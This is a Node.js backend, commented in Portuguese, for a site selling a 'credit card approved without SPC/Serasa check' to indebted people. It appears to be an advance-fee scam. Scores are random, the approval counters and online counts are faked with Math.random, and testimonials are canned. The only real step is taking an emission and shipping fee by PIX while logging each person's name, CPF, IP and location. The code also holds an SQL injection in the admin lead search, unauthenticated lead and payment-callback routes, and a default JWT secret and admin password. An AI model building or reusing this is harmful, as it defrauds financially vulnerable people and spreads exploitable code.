const express = require('express');
const http = require('http');
const https = require('https');
const { Server } = require('socket.io');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const QRCode = require('qrcode');
const path = require('path');
const fs = require('fs');
const multer = require('multer');
require('dotenv').config();

const app = express();
const server = http.createServer(app);

const FRONTEND_URL = process.env.FRONTEND_URL || 'http://localhost:3000';

// Aceita qualquer origem HTTPS ou localhost (funciona com qualquer domínio apontado)
const isAllowedOrigin = (origin) =>
  !origin || origin.startsWith('https://') || origin.includes('localhost');
const JWT_SECRET = process.env.JWT_SECRET || 'projetocredito_secret_2024';
const PORT = process.env.PORT || 3001;
const DB_PATH = process.env.DB_PATH || path.join(__dirname, 'database.bin');

// ─── UPLOADS ──────────────────────────────────────────────────────────────────
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR, { recursive: true });

const ALLOWED_MIME = new Set([
  'image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/webp',
  'image/svg+xml', 'image/avif', 'image/bmp', 'image/x-icon', 'image/ico',
  'image/tiff', 'image/heic', 'image/heif', 'image/jxl',
]);
const ALLOWED_EXT = /\.(jpe?g|png|gif|webp|svg|avif|bmp|ico|tiff?|heic|heif|jxl)$/i;

const upload = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, UPLOADS_DIR),
    filename: (req, file, cb) => {
      const ext = path.extname(file.originalname).toLowerCase() || '.bin';
      cb(null, `banner_${Date.now()}_${Math.random().toString(36).slice(2, 7)}${ext}`);
    },
  }),
  limits: { fileSize: 15 * 1024 * 1024 }, // 15 MB
  fileFilter: (req, file, cb) => {
    const okMime = ALLOWED_MIME.has(file.mimetype);
    const okExt  = ALLOWED_EXT.test(file.originalname);
    if (okMime || okExt) cb(null, true);
    else cb(new Error(`Formato não suportado: ${file.mimetype}`));
  },
});

const io = new Server(server, {
  cors: {
    origin: (origin, callback) => callback(null, isAllowedOrigin(origin)),
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    credentials: true,
  },
});

// ─── DATABASE (sql.js) ───────────────────────────────────────────────────────
let SQL, db;

async function initDB() {
  const initSqlJs = require('sql.js');
  SQL = await initSqlJs();

  // Carrega banco existente ou cria novo
  if (fs.existsSync(DB_PATH)) {
    const fileBuffer = fs.readFileSync(DB_PATH);
    db = new SQL.Database(fileBuffer);
    console.log('📂 Banco de dados carregado');
  } else {
    db = new SQL.Database();
    console.log('🆕 Novo banco de dados criado');
  }

  // Cria tabelas
  db.run(`
    CREATE TABLE IF NOT EXISTS leads (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      name TEXT NOT NULL,
      cpf TEXT NOT NULL,
      profile TEXT NOT NULL,
      score INTEGER,
      limit_value REAL DEFAULT 2000,
      status TEXT DEFAULT 'analyzing',
      payment_status TEXT DEFAULT 'pending',
      session_id TEXT,
      ip TEXT,
      location TEXT,
      created_at TEXT DEFAULT (datetime('now','localtime'))
    );
    CREATE TABLE IF NOT EXISTS chat_messages (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      session_id TEXT NOT NULL,
      sender TEXT NOT NULL,
      message TEXT NOT NULL,
      read INTEGER DEFAULT 0,
      created_at TEXT DEFAULT (datetime('now','localtime'))
    );
    CREATE TABLE IF NOT EXISTS admin_users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE NOT NULL,
      password TEXT NOT NULL
    );
    CREATE TABLE IF NOT EXISTS settings (
      key TEXT PRIMARY KEY,
      value TEXT NOT NULL
    );
  `);

  // Migração: adiciona colunas novas em bancos existentes
  try { db.run('ALTER TABLE leads ADD COLUMN location TEXT'); } catch { /* já existe */ }

  // Admin padrão
  const adminRows = db.exec("SELECT id FROM admin_users WHERE username = 'admin'");
  if (!adminRows.length || !adminRows[0].values.length) {
    const hashed = bcrypt.hashSync(process.env.ADMIN_PASSWORD || 'admin123', 10);
    db.run('INSERT INTO admin_users (username, password) VALUES (?, ?)', ['admin', hashed]);
    console.log('✅ Admin criado');
  } else if (process.env.ADMIN_PASSWORD) {
    // Sempre atualiza a senha se a variável de ambiente estiver definida
    const hashed = bcrypt.hashSync(process.env.ADMIN_PASSWORD, 10);
    db.run("UPDATE admin_users SET password = ? WHERE username = 'admin'", [hashed]);
    console.log('🔑 Senha do admin sincronizada com ADMIN_PASSWORD');
  }

  // Configurações padrão
  const defaults = [
    ['emission_fee', '19.90'],
    ['shipping_fee', '29.90'],
    ['max_limit', '2000'],
    ['pix_key', '11999999999'],
    ['pix_type', 'telefone'],
    ['beneficiary_name', 'CARTAO PREMIUM DIGITAL'],
    ['approved_today', '12847'],
    ['sigilopay_public_key', ''],
    ['sigilopay_secret_key', ''],
    ['webhook_token', ''],
    ['site_customization', JSON.stringify({
      brand: { name: 'CreditoFácil', tagline: 'Cartão para negativados' },
      cores: {
        primaria: '#820AD1', segundaria: '#4b047d',
        background: '#ffffff', textoTitulo: '#111827', textoCorpo: '#6b7280', textoDestaque: '#820AD1',
        navbarBg: '#820AD1', navbarTexto: '#ffffff', navbarBorda: 'rgba(130,10,209,0.8)',
        heroBg: 'transparent', beneficiosBg: 'transparent',
        cardBg: 'rgba(255,255,255,0.85)', cardBorda: 'rgba(130,10,209,0.12)',
        passosBg: 'transparent', depoimentosBg: 'transparent',
        segurancaBg: 'rgba(248,240,255,0.7)',
        faqBg: 'transparent', ctaBg: 'rgba(130,10,209,0.06)', ctaBorda: 'rgba(130,10,209,0.2)',
        footerBg: '#ffffff', footerBorda: '#e5e7eb', footerTexto: '#6b7280',
        cartaoCorInicio: '#820AD1', cartaoCorMeio: '#4b047d', cartaoCorFim: '#23023c',
      },
      banners: {
        hero: '', heroBgOpacity: '0.15',
        navbar: '',
        beneficios: '', beneficiosBgOpacity: '0.12',
        passos: '', passosBgOpacity: '0.12',
        depoimentos: '', depoimentosBgOpacity: '0.12',
        seguranca: '', segurancaBgOpacity: '0.12',
        faq: '', faqBgOpacity: '0.12',
        cta: '', ctaBgOpacity: '0.12',
        footer: '', footerBgOpacity: '0.1',
      },
      hero: {
        titulo1: 'Cartão de crédito', titulo2: 'aprovado mesmo', titulo3: 'negativado',
        subtitulo: 'Limite de até ', limiteDestaque: 'R$ 2.000', subtituloFim: ' sem consulta ao SPC/Serasa. Aprovação em minutos.',
        ctaPrincipal: 'Quero meu cartão agora', ctaSecundario: 'Ver como funciona',
        badgeAprovados: 'aprovados hoje', badgeSemConsulta: 'Sem consulta SPC', badgeAprovacao: 'Aprovação imediata',
      },
      beneficios: [
        { icon: '💳', titulo: 'Cartão físico Mastercard', desc: 'Aceito em todo o Brasil e no exterior' },
        { icon: '🚀', titulo: 'Aprovação em minutos', desc: 'Análise automatizada, sem burocracia' },
        { icon: '🔒', titulo: 'Sem consulta SPC/Serasa', desc: 'Negativados são bem-vindos aqui' },
        { icon: '💰', titulo: 'Até R$2.000 de limite', desc: 'Limite real para suas compras do dia a dia' },
        { icon: '📱', titulo: 'Controle pelo app', desc: 'Gerencie tudo pelo celular, 24h por dia' },
        { icon: '✨', titulo: 'Sem anuidade no 1º ano', desc: 'Sem surpresas na fatura do cartão' },
      ],
      passos: [
        { numero: '01', titulo: 'Escolha seu perfil', desc: 'Selecione se já é cliente ou se está negativado' },
        { numero: '02', titulo: 'Informe seus dados', desc: 'Apenas nome e CPF. Rápido e seguro.' },
        { numero: '03', titulo: 'Análise imediata', desc: 'Seu score é calculado em segundos' },
        { numero: '04', titulo: 'Receba seu cartão', desc: 'Pague a taxa e receba em casa em até 7 dias' },
      ],
      depoimentos: [
        { nome: 'Maria S.', texto: 'Estava negativada há 3 anos e consegui meu cartão em 10 minutos. Incrível!', nota: 5, cidade: 'São Paulo, SP' },
        { nome: 'João P.', texto: 'Tentei em vários lugares e fui recusado. Aqui foi aprovado na hora!', nota: 5, cidade: 'Rio de Janeiro, RJ' },
        { nome: 'Ana Lima', texto: 'Atendimento excelente e cartão chegou antes do prazo. Super recomendo!', nota: 5, cidade: 'Belo Horizonte, MG' },
      ],
      faq: [
        { pergunta: 'Posso solicitar mesmo com nome sujo?', resposta: 'Sim! Nossa análise é diferenciada e aprovamos mesmo com restrições no SPC/Serasa.' },
        { pergunta: 'Quanto tempo leva para receber o cartão?', resposta: 'Após a confirmação do pagamento da taxa de emissão, seu cartão chega em até 7 dias úteis.' },
        { pergunta: 'Qual é o limite do cartão?', resposta: 'O limite inicial é de até R$2.000, podendo ser aumentado conforme seu uso.' },
        { pergunta: 'Existe alguma taxa mensal?', resposta: 'Não cobramos anuidade no primeiro ano. Apenas a taxa de emissão e frete para envio do cartão.' },
        { pergunta: 'Como funciona a taxa de emissão?', resposta: 'A taxa cobre os custos de personalização, emissão e entrega do cartão físico em sua residência.' },
      ],
      rodape: { texto: '© 2024 CreditoFácil. Todos os direitos reservados.', descricao: 'Serviço de intermediação financeira. Não somos uma instituição financeira.' },
      funil: {
        perfilTitulo: 'Qual é o seu perfil?', perfilSubtitulo: 'Selecione para personalizarmos a melhor oferta para você',
        formularioTitulo: 'Seus dados', formularioSubtitulo: 'Precisamos apenas do seu nome e CPF para a consulta',
        analiseTitulo: 'Analisando seu perfil', resultadoTitulo: 'Parabéns! Pré-aprovado!',
        emissaoTitulo: 'Emitir seu cartão', emissaoSubtitulo: 'Pague a taxa de emissão via PIX e receba em casa',
        confirmacaoTitulo: 'Pedido confirmado!', confirmacaoSubtitulo: 'Seu cartão está sendo preparado',
      },
      suporte: { whatsapp: '(11) 99999-9999', email: 'suporte@creditofacil.com', horario: 'Seg a Sex, 8h às 18h' },
      chat: { bemVindo: 'Olá! Sou a assistente virtual do CreditoFácil. Como posso te ajudar?', respostaPadrao: 'Entendo sua dúvida! Para mais informações, clique em "Quero meu cartão agora" e inicie sua análise.' },
    })],
  ];
  defaults.forEach(([k, v]) => {
    db.run('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', [k, v]);
  });

  saveDB();
}

// Persiste o banco em disco
function saveDB() {
  try {
    const data = db.export();
    fs.writeFileSync(DB_PATH, Buffer.from(data));
  } catch (e) {
    console.error('Erro ao salvar DB:', e);
  }
}

// Salva a cada 30 segundos
setInterval(saveDB, 30000);

// ─── GEOLOCALIZAÇÃO ───────────────────────────────────────────────────────────
async function fetchGeolocation(ip) {
  try {
    const clean = (ip || '').split(',')[0].trim().replace(/^::ffff:/, '');
    if (!clean || clean === '::1' || clean === '127.0.0.1') return '';
    const data = await new Promise((resolve, reject) => {
      http.get(`http://ip-api.com/json/${clean}?fields=status,city,regionName,countryCode`, (res) => {
        let raw = '';
        res.on('data', d => raw += d);
        res.on('end', () => { try { resolve(JSON.parse(raw)); } catch { reject(); } });
      }).on('error', reject);
    });
    if (data.status === 'success') return [data.city, data.regionName, data.countryCode].filter(Boolean).join(', ');
  } catch { /* ignora */ }
  return '';
}

// ─── SIGILOPAY ────────────────────────────────────────────────────────────────
async function gerarPixSigiloPay(settings, total, lead) {
  const pub = settings.sigilopay_public_key;
  const sec = settings.sigilopay_secret_key;
  if (!pub || !sec) return null;

  const identifier = `CF${lead?.id || '0'}_${Date.now()}`;
  const payload = JSON.stringify({
    identifier,
    amount: parseFloat(total.toFixed(2)),
    client: {
      name: lead?.name || 'Cliente',
      email: lead?.email || 'cliente@email.com',
      phone: String(lead?.phone || '11999999999').replace(/\D/g, ''),
      document: String(lead?.cpf || '').replace(/\D/g, ''),
    },
    callbackUrl: `${process.env.API_BASE_URL || `http://localhost:${PORT}`}/api/webhook/sigilopay`,
    metadata: { leadId: String(lead?.id || '') },
  });

  return new Promise((resolve) => {
    const req = https.request({
      hostname: 'app.sigilopay.com.br',
      path: '/api/v1/gateway/pix/receive',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
        'x-public-key': pub,
        'x-secret-key': sec,
      },
    }, (res) => {
      let raw = '';
      res.on('data', d => raw += d);
      res.on('end', () => {
        try { resolve(JSON.parse(raw)); } catch { resolve(null); }
      });
    });
    req.on('error', () => resolve(null));
    req.write(payload);
    req.end();
  });
}

// Helpers
function queryAll(sql, params = []) {
  try {
    const stmt = db.prepare(sql);
    stmt.bind(params);
    const rows = [];
    while (stmt.step()) {
      rows.push(stmt.getAsObject());
    }
    stmt.free();
    return rows;
  } catch (e) {
    console.error('queryAll error:', e, sql);
    return [];
  }
}

function queryOne(sql, params = []) {
  const rows = queryAll(sql, params);
  return rows[0] || null;
}

function execute(sql, params = []) {
  try {
    db.run(sql, params);
    // Pega o last_insert_rowid usando prepared statement (mais confiável no sql.js)
    const stmt = db.prepare('SELECT last_insert_rowid()');
    let lastId = 0;
    if (stmt.step()) {
      const row = stmt.get();
      lastId = Number(row[0]) || 0;
    }
    stmt.free();
    saveDB();
    return lastId;
  } catch (e) {
    console.error('execute error:', e, sql);
    throw e;
  }
}

function getSettings() {
  const rows = queryAll('SELECT key, value FROM settings');
  return Object.fromEntries(rows.map(r => [r.key, r.value]));
}

// ─── MIDDLEWARE ───────────────────────────────────────────────────────────────
app.use(cors({
  origin: (origin, callback) => callback(null, isAllowedOrigin(origin)),
  credentials: true,
}));
app.use(express.json({ limit: '2mb' }));
app.use('/uploads', express.static(UPLOADS_DIR));

const authMiddleware = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Token obrigatório' });
  try {
    req.user = jwt.verify(token, JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ error: 'Token inválido' });
  }
};

// ─── AUTH ─────────────────────────────────────────────────────────────────────
app.post('/api/auth/login', (req, res) => {
  const { username, password } = req.body;
  const user = queryOne('SELECT * FROM admin_users WHERE username = ?', [username]);
  if (!user || !bcrypt.compareSync(password, user.password)) {
    return res.status(401).json({ error: 'Usuário ou senha incorretos' });
  }
  const token = jwt.sign({ id: user.id, username: user.username }, JWT_SECRET, { expiresIn: '12h' });
  res.json({ token, username: user.username });
});

app.get('/api/auth/verify', authMiddleware, (req, res) => {
  res.json({ valid: true, user: req.user });
});

// ─── LEADS ────────────────────────────────────────────────────────────────────
app.post('/api/leads', (req, res) => {
  const { name, cpf, profile, sessionId } = req.body;
  if (!name || !cpf || !profile) return res.status(400).json({ error: 'Dados incompletos' });

  const score = profile === 'client'
    ? Math.floor(Math.random() * 201) + 650   // 650-850
    : Math.floor(Math.random() * 251) + 300;  // 300-550

  const settings = getSettings();
  const limitValue = parseFloat(settings.max_limit || 2000);
  const ip = (
    req.headers['cf-connecting-ip'] ||
    req.headers['x-real-ip'] ||
    req.headers['x-forwarded-for'] ||
    req.socket.remoteAddress || ''
  ).split(',')[0].trim();

  const id = execute(
    'INSERT INTO leads (name, cpf, profile, score, limit_value, session_id, ip) VALUES (?, ?, ?, ?, ?, ?, ?)',
    [name, cpf, profile, score, limitValue, sessionId || '', ip]
  );

  const lead = { id, name, cpf, profile, score, limit_value: limitValue, status: 'analyzing', payment_status: 'pending', ip, location: '', created_at: new Date().toISOString() };
  io.to('admin').emit('new_lead', lead);

  // Geolocalização assíncrona (não bloqueia a resposta)
  fetchGeolocation(ip).then(location => {
    if (location) {
      execute('UPDATE leads SET location = ? WHERE id = ?', [location, id]);
    }
  }).catch(() => {});

  res.json({ id, score, limit_value: limitValue });
});

app.put('/api/leads/:id', (req, res) => {
  const { status, payment_status } = req.body;
  execute('UPDATE leads SET status = ?, payment_status = ? WHERE id = ?', [status || 'pending', payment_status || 'pending', req.params.id]);
  io.to('admin').emit('lead_updated', { id: parseInt(req.params.id), status, payment_status });
  res.json({ success: true });
});

// ─── PIX ──────────────────────────────────────────────────────────────────────
app.post('/api/pix/generate', async (req, res) => {
  const { amount, leadId } = req.body;
  const settings = getSettings();
  const emission_fee = parseFloat(settings.emission_fee || 19.90);
  const shipping_fee = parseFloat(settings.shipping_fee || 29.90);
  const total = amount || (emission_fee + shipping_fee);

  // Busca dados do lead para SigiloPay
  const lead = leadId ? queryOne('SELECT * FROM leads WHERE id = ?', [leadId]) : null;

  // Tenta SigiloPay primeiro
  try {
    const sigiloData = await gerarPixSigiloPay(settings, total, lead);
    if (sigiloData && sigiloData.pix && sigiloData.pix.code) {
      const b64 = sigiloData.pix.base64 || '';
      const qrCode = b64 ? (b64.startsWith('data:') ? b64 : `data:image/png;base64,${b64}`) : null;
      return res.json({
        pixCode: sigiloData.pix.code,
        qrCode,
        amount: total,
        emission_fee,
        shipping_fee,
        transactionId: sigiloData.transactionId || '',
        gateway: 'sigilopay',
      });
    }
  } catch { /* fallback para PIX local */ }

  // Fallback: PIX local
  const pixPayload = gerarPixSimples(settings.pix_key || '11999999999', settings.beneficiary_name || 'CARTAO PREMIUM', total);
  try {
    const qrCode = await QRCode.toDataURL(pixPayload, { width: 260, margin: 1, color: { dark: '#1a0533', light: '#ffffff' } });
    res.json({ pixCode: pixPayload, qrCode, amount: total, emission_fee, shipping_fee, gateway: 'local' });
  } catch {
    res.status(500).json({ error: 'Erro ao gerar QR Code' });
  }
});

// ─── WEBHOOK SIGILOPAY ────────────────────────────────────────────────────────
function processPaymentWebhook(body) {
  // Extrai o leadId de múltiplas fontes possíveis
  let leadId = body.metadata?.leadId || body.leadId || null;

  // Tenta extrair do identifier: "CF{leadId}_{timestamp}"
  if (!leadId && body.identifier) {
    const match = String(body.identifier).match(/^CF(\d+)_/);
    if (match) leadId = match[1];
  }

  if (!leadId) return false;

  execute(
    "UPDATE leads SET payment_status = 'paid', status = 'approved' WHERE id = ?",
    [String(leadId)]
  );
  const lead = queryOne('SELECT * FROM leads WHERE id = ?', [String(leadId)]);
  if (lead) {
    io.to('admin').emit('lead_updated', { id: parseInt(leadId), status: 'approved', payment_status: 'paid' });
    io.to(`session_${lead.session_id}`).emit('payment_confirmed', { leadId: parseInt(leadId) });
  }
  return true;
}

// Endpoint principal do webhook SigiloPay
app.post('/api/webhook/sigilopay', (req, res) => {
  try {
    const body = req.body || {};
    const settings = getSettings();

    // Valida token se configurado
    const webhookToken = settings.webhook_token || '';
    if (webhookToken && body.token !== webhookToken) {
      console.warn('Webhook: token inválido recebido');
      return res.status(401).json({ error: 'Token inválido' });
    }

    const event = (body.event || '').toUpperCase();
    const isPaid = event === 'TRANSACTION_PAID' || event === 'PAYMENT_CONFIRMED';
    const statusPaid = ['paid', 'approved', 'completed'].includes((body.status || '').toLowerCase());

    if (isPaid || statusPaid) {
      processPaymentWebhook(body);
    }

    res.json({ received: true });
  } catch (e) {
    console.error('Webhook error:', e);
    res.status(500).json({ error: 'Webhook error' });
  }
});

// Mantém rota antiga como alias
app.post('/api/pix/callback', (req, res) => {
  try {
    const body = req.body || {};
    const status = (body.status || '').toLowerCase();
    if (status === 'paid' || status === 'approved' || status === 'completed') {
      processPaymentWebhook(body);
    }
    res.json({ received: true });
  } catch (e) {
    console.error('Callback error:', e);
    res.status(500).json({ error: 'Callback error' });
  }
});

function gerarPixSimples(chave, nome, valor) {
  const f = (id, v) => `${id}${String(v).length.toString().padStart(2, '0')}${v}`;
  const pixKey = f('01', chave);
  const gui = f('26', f('00', 'BR.GOV.BCB.PIX') + f('01', pixKey));
  const nomeTrunc = nome.substring(0, 25).padEnd(1, ' ');
  const valorStr = parseFloat(valor).toFixed(2);
  const payload = `000201${gui}52040000530398654${valorStr.length.toString().padStart(2, '0')}${valorStr}5802BR${f('59', nomeTrunc)}${f('60', 'SAO PAULO')}${f('62', f('05', 'CF' + Date.now().toString().slice(-8)))}6304`;
  const crc = crc16(payload + '0000');
  return payload.slice(0, -4) + crc;
}

function crc16(str) {
  let crc = 0xFFFF;
  for (let i = 0; i < str.length; i++) {
    crc ^= str.charCodeAt(i) << 8;
    for (let j = 0; j < 8; j++) crc = (crc & 0x8000) ? ((crc << 1) ^ 0x1021) & 0xFFFF : (crc << 1) & 0xFFFF;
  }
  return crc.toString(16).toUpperCase().padStart(4, '0');
}

// ─── ADMIN ────────────────────────────────────────────────────────────────────
app.get('/api/admin/dashboard', authMiddleware, (req, res) => {
  const total = queryOne('SELECT COUNT(*) as c FROM leads')?.c || 0;
  const paid  = queryOne("SELECT COUNT(*) as c FROM leads WHERE payment_status = 'paid'")?.c || 0;
  const today = queryOne("SELECT COUNT(*) as c FROM leads WHERE date(created_at) = date('now','localtime')")?.c || 0;
  const recent = queryAll('SELECT * FROM leads ORDER BY created_at DESC LIMIT 15');
  const profileStats = queryAll('SELECT profile, COUNT(*) as count FROM leads GROUP BY profile');
  const leadsByDay = queryAll(`
    SELECT
      date(created_at, 'localtime') as day,
      COUNT(*) as total,
      SUM(CASE WHEN payment_status='paid' THEN 1 ELSE 0 END) as paid
    FROM leads
    WHERE created_at >= datetime('now', '-6 days', 'localtime')
    GROUP BY date(created_at, 'localtime')
    ORDER BY day ASC
  `);
  const settings = getSettings();
  const ticketMedio = parseFloat(settings.emission_fee || 19.90) + parseFloat(settings.shipping_fee || 29.90);

  res.json({ total, paid, today, pending: total - paid, revenue: paid * ticketMedio, recent, profileStats, ticketMedio, leadsByDay });
});

app.get('/api/admin/leads', authMiddleware, (req, res) => {
  const { search = '', page = 1, limit = 20 } = req.query;
  const offset = (parseInt(page) - 1) * parseInt(limit);
  const where = search ? `WHERE name LIKE '%${search}%' OR cpf LIKE '%${search}%'` : '';
  const total = queryOne(`SELECT COUNT(*) as c FROM leads ${where}`)?.c || 0;
  const leads = queryAll(`SELECT * FROM leads ${where} ORDER BY created_at DESC LIMIT ? OFFSET ?`, [parseInt(limit), offset]);
  res.json({ leads, total, page: parseInt(page), pages: Math.ceil(total / parseInt(limit)) });
});

app.delete('/api/admin/leads/:id', authMiddleware, (req, res) => {
  execute('DELETE FROM leads WHERE id = ?', [req.params.id]);
  res.json({ success: true });
});

app.get('/api/admin/settings', authMiddleware, (req, res) => {
  res.json(getSettings());
});

app.put('/api/admin/settings', authMiddleware, (req, res) => {
  Object.entries(req.body).forEach(([k, v]) => {
    execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', [k, String(v)]);
  });
  res.json({ success: true });
});

app.get('/api/admin/chats', authMiddleware, (req, res) => {
  const sessions = queryAll(`
    SELECT session_id,
      MAX(created_at) as last_message,
      COUNT(*) as total_messages,
      SUM(CASE WHEN read = 0 AND sender = 'user' THEN 1 ELSE 0 END) as unread
    FROM chat_messages GROUP BY session_id ORDER BY last_message DESC
  `);

  const enriched = sessions.map(s => {
    const lastMsg = queryOne('SELECT message, sender FROM chat_messages WHERE session_id = ? ORDER BY created_at DESC LIMIT 1', [s.session_id]);
    const lead = queryOne('SELECT name FROM leads WHERE session_id = ? LIMIT 1', [s.session_id]);
    return { ...s, last_msg: lastMsg?.message || '', last_sender: lastMsg?.sender || '', lead_name: lead?.name || '' };
  });

  res.json(enriched);
});

app.get('/api/admin/chats/:sessionId', authMiddleware, (req, res) => {
  const msgs = queryAll('SELECT * FROM chat_messages WHERE session_id = ? ORDER BY created_at ASC', [req.params.sessionId]);
  execute("UPDATE chat_messages SET read = 1 WHERE session_id = ? AND sender = 'user'", [req.params.sessionId]);
  res.json(msgs);
});

app.get('/api/stats', (req, res) => {
  const settings = getSettings();
  const base = parseInt(settings.approved_today || 12847);
  res.json({ approvedToday: base + Math.floor(Math.random() * 10), onlineNow: Math.floor(Math.random() * 40) + 80 });
});

app.put('/api/admin/credentials', authMiddleware, (req, res) => {
  const { currentPassword, newUsername, newPassword } = req.body;
  if (!currentPassword) return res.status(400).json({ error: 'Senha atual obrigatória' });

  const user = queryOne('SELECT * FROM admin_users WHERE id = ?', [req.user.id]);
  if (!user || !bcrypt.compareSync(currentPassword, user.password)) {
    return res.status(401).json({ error: 'Senha atual incorreta' });
  }

  if (newUsername && newUsername !== user.username) {
    const exists = queryOne('SELECT id FROM admin_users WHERE username = ? AND id != ?', [newUsername, req.user.id]);
    if (exists) return res.status(400).json({ error: 'Nome de usuário já em uso' });
    execute('UPDATE admin_users SET username = ? WHERE id = ?', [newUsername, req.user.id]);
  }

  if (newPassword) {
    if (newPassword.length < 6) return res.status(400).json({ error: 'Nova senha deve ter ao menos 6 caracteres' });
    const hashed = bcrypt.hashSync(newPassword, 10);
    execute('UPDATE admin_users SET password = ? WHERE id = ?', [hashed, req.user.id]);
  }

  res.json({ success: true });
});

app.get('/api/webhook-url', authMiddleware, (req, res) => {
  const base = process.env.API_BASE_URL || `http://localhost:${PORT}`;
  res.json({ url: `${base}/api/webhook/sigilopay` });
});

app.get('/api/site-config', (req, res) => {
  const settings = getSettings();
  try {
    const config = JSON.parse(settings.site_customization || '{}');
    res.json(config);
  } catch {
    res.json({});
  }
});

app.put('/api/admin/site-config', authMiddleware, (req, res) => {
  execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ['site_customization', JSON.stringify(req.body)]);
  saveDB();
  res.json({ success: true });
});

// Upload de banner/imagem
app.post('/api/admin/upload', authMiddleware, (req, res) => {
  upload.single('file')(req, res, (err) => {
    if (err instanceof multer.MulterError) {
      if (err.code === 'LIMIT_FILE_SIZE') return res.status(413).json({ error: 'Arquivo muito grande. Máximo: 15 MB.' });
      return res.status(400).json({ error: err.message });
    }
    if (err) return res.status(400).json({ error: err.message });
    if (!req.file) return res.status(400).json({ error: 'Nenhum arquivo enviado.' });

    const baseUrl = process.env.API_BASE_URL || `http://localhost:${PORT}`;
    const url = `${baseUrl}/uploads/${req.file.filename}`;
    res.json({ url, filename: req.file.filename, size: req.file.size, mime: req.file.mimetype });
  });
});

// Deletar arquivo de upload
app.delete('/api/admin/upload/:filename', authMiddleware, (req, res) => {
  const file = path.join(UPLOADS_DIR, path.basename(req.params.filename));
  try { if (fs.existsSync(file)) fs.unlinkSync(file); } catch { /* ignora */ }
  res.json({ success: true });
});

// ─── SOCKET.IO ────────────────────────────────────────────────────────────────
const onlineUsers = new Map();

io.on('connection', (socket) => {
  socket.on('admin_auth', (token) => {
    try {
      jwt.verify(token, JWT_SECRET);
      socket.join('admin');
      socket.emit('admin_ready', { online_count: onlineUsers.size });
    } catch { socket.emit('auth_error', 'Token inválido'); }
  });

  socket.on('user_join', ({ sessionId, name }) => {
    socket.join(`session_${sessionId}`);
    onlineUsers.set(sessionId, { name, socketId: socket.id });
    io.to('admin').emit('user_online', { sessionId, name, online_count: onlineUsers.size });

    setTimeout(() => {
      const welcome = {
        session_id: sessionId,
        sender: 'support',
        message: `Olá, ${name?.split(' ')[0] || ''}! 👋 Posso te ajudar com sua solicitação de cartão?`,
        created_at: new Date().toISOString()
      };
      execute('INSERT INTO chat_messages (session_id, sender, message) VALUES (?, ?, ?)', [sessionId, 'support', welcome.message]);
      socket.emit('receive_message', welcome);
    }, 1500);
  });

  socket.on('send_message', ({ sessionId, message, sender }) => {
    const msg = { session_id: sessionId, sender, message, created_at: new Date().toISOString() };
    execute('INSERT INTO chat_messages (session_id, sender, message) VALUES (?, ?, ?)', [sessionId, sender, message]);

    if (sender === 'user') {
      io.to('admin').emit('receive_message', msg);
      socket.emit('receive_message', msg);
    } else {
      io.to(`session_${sessionId}`).emit('receive_message', msg);
      io.to('admin').emit('receive_message', msg);
    }
  });

  socket.on('disconnect', () => {
    onlineUsers.forEach((val, key) => {
      if (val.socketId === socket.id) {
        onlineUsers.delete(key);
        io.to('admin').emit('user_offline', { sessionId: key, online_count: onlineUsers.size });
      }
    });
  });
});

// ─── START ────────────────────────────────────────────────────────────────────
initDB().then(() => {
  server.listen(PORT, () => {
    console.log(`\n🚀 Backend rodando em http://localhost:${PORT}`);
    console.log(`🔑 Admin: http://localhost:3000/admin (admin / admin123)\n`);
  });
}).catch(err => {
  console.error('Erro ao inicializar:', err);
  process.exit(1);
});
